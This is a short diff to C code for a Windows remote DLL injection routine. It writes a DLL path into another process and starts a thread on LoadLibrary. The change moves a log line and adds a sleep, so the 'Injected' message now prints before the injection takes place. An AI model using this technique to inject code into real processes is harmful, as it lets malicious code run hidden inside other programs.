@@ -90,12 +90,13 @@ BOOL RemoteProcessDllInjection(IN DWORD dwMemoryType, IN LPCSTR lpProcessName, I
 	}
 	sShellcodePathSize = lstrlenA(lpShellcodePath);
 
+	printf("[i] Injected %s DLL into the remote process\n", lpShellcodePath);
 	if (!AllocateMemory(NULL, hProcess, lpShellcodePath, sShellcodePathSize, &pDllPathAddr))
 		return FALSE;
 
 	if ((hThread = CreateRemoteThread(hProcess, NULL, NULL, pLoadLibrary, pDllPathAddr, NULL, &dwThreadId)) == NULL)
 		return ReportErrorWinAPI("CreateRemoteThread");
-	printf("[i] Injected DLL into the remote process via thread with ID %d\n", dwThreadId);
+	Sleep(100);
 
 	FreeMemory(dwMemoryType, hProcess, pDllPathAddr);
 	CloseHandle(hThread);
